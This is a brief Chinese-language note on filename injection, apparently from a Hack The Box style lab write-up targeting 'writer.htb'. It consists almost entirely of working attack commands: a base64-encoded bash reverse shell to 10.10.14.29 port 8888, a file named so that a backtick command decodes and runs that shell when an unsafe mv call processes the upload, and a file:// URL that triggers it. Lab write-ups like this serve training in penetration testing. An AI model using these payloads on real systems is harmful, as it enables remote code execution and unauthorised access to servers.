# 文件名注入

1. 当能发现文件上传的一些底层逻辑，发现mv的不安全调用

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.29/8888 0>&1"' | base64

touch 'd.jpg;`echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS84ODg4IDA+JjEi|base64 -d|bash`;'
```

1. 访问方法（访问网页文件）

```bash
file:///var/www/writer.htb/writer/static/img/d.jpg;`echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS84ODg4IDA+JjEi|base64 -d|bash`;#
```
